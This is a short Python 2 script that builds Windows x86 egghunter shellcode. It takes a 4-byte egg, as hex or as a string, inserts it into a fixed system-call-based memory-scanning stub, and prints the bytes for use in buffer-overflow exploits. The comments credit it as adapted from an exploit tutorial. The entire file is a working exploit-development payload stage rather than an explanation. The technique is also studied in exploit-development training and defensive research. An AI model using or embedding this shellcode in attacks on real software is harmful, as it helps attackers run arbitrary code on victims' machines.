#!/usr/bin/python
#
# eggHuntSyscall.py for Python
# @TheRealJoeDoran
#
# Inspired by the syscall egghunter written by Matt Miller (skape)
#
# Ported and modified from TheGreyCorner "Egghunter Exploitation Tutorial" by Stephen Bradshaw
# http://www.thegreycorner.com/2011/10/egghunter-based-exploit-for-vulnserver.html
#

from struct import *
import sys
import re

BIG_ENDIAN = 0
LITTLE_ENDIAN = 1





def pythonHex( str, mode ):
        hex = str[2:10].decode('hex')

        if mode == BIG_ENDIAN:
                be = ""
                for idx in range(0, len(hex)):
                        be+="\\x"+hex[idx].encode('hex')

                return be

        elif mode == LITTLE_ENDIAN:
                le = ""
                for idx in range(len(hex),0, -1):
                        le+="\\x"+hex[idx-1].encode('hex')

                return le




def pythonString( str, mode ):
        if mode == BIG_ENDIAN:
                be = ""
                for idx in range(0, len(str)):
                        be+="\\x"+str[idx].encode('hex')

                return be

        return True





def validEgg( egg ):
        validHex = re.compile(r"^[0][x][0-9a-f]{8}$")
        validString = re.compile(r"^[0-9a-zA-Z]{4}$")

        if (validHex.match(egg) is None) and (validString.match(egg) is None):
                retn = "Invalid"
        elif validHex.match(egg):
                retn = "validHex"
        else:
                retn = "validString"

        return retn




def printUsage():
        print 'Usage: %s <egg>\nEgg is a 32-bit value in hex, or a 4-byte string.\nExample: %s 0x41424344\nExample: %s a3gv\n' % (sys.argv[0], sys.argv[0], sys.argv[0])





#
#
# MAIN
#
#
try:
        egg = sys.argv[1]
except IndexError:
        printUsage()
        sys.exit()

validEgg = validEgg(egg)
if validEgg == "Invalid":
        printUsage()
        sys.exit()

elif validEgg == "validHex":
        print "Valid Hex: %s" % (egg)

        shellCode = "\\x66\\x81\\xca\\xff\\x0f\\x42\\x52\\x6a\\x02\\x58\\xcd\\x2e\\x3c\\x05\\x5a\\x74\\xef\\xb8"
        shellCode += pythonHex( egg, BIG_ENDIAN )
        shellCode += "\\x8b\\xfa\\xaf\\x75\\xea\\xaf\\x75\\xe7\\xff\\xe7"

        print "Egghunter shellcode:\n" + shellCode + "\nSize: " + str(len(shellCode)/4) + " bytes"

elif validEgg == "validString":
        print "Valid String: %s" % (egg)

        shellCode = "\\x66\\x81\\xca\\xff\\x0f\\x42\\x52\\x6a\\x02\\x58\\xcd\\x2e\\x3c\\x05\\x5a\\x74\\xef\\xb8"
        shellCode += pythonString( egg, BIG_ENDIAN )
        shellCode += "\\x8b\\xfa\\xaf\\x75\\xea\\xaf\\x75\\xe7\\xff\\xe7"

        print "Egghunter shellcode:\n" + shellCode + "\nSize: " + str(len(shellCode)/4) + " bytes"

else:
        print "*** Unexpected conditions ***"
        printUsage()
        sys.exit()

